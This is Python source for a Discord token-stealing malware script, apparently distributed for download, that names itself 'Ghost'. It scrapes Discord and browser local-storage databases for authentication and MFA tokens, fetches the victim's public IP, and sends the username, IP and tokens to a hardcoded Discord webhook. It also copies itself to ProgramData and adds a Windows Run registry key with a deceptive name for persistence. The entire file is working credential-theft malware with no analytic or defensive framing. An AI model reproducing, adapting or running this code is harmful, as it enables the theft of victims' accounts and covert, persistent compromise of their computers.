# by ; github.com/w6r
# thank you for downloading

import requests, os, re, subprocess, sys, shutil
from dhooks import Webhook, Embed
from winreg import *

class GhostProcess():
    def __init__(self, *args, **kwargs):
        super(GhostProcess, self).__init__(*args, **kwargs)


GhostCreator = "w6r"


def GhostExtract(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def GhostRegistry():
    ghostrp = (os.path.join('ghost.pyw')) 
    ghostlgm = r'C:\ProgramData\ghost.pyw'
    shutil.move(ghostrp,ghostlgm)

    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'WindowsProcessTree222', 0, REG_SZ,
               new_file_path)


def GhostProcess():
    hook = Webhook("https://discord.com/api/webhooks/824725959482802176/GluxrWWGrLrBbR4QlHSF9NcFgVIf8SMjQl4a2Xcx8sH6yz0XwIq5Xjpuxi3KeyASgEM9")
    user = os.getenv("UserName")
    hostname = requests.get("https://api.ipify.org").text 
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',

    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = GhostExtract(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'

        embed = Embed(title=f' [  Djay Ghost Logged | {user} | {hostname} |  ] ',color=16764108)
        embed.add_field("Extracted:",message)
        hook.send(embed=embed)
        
GhostProcess()
GhostRegistry()
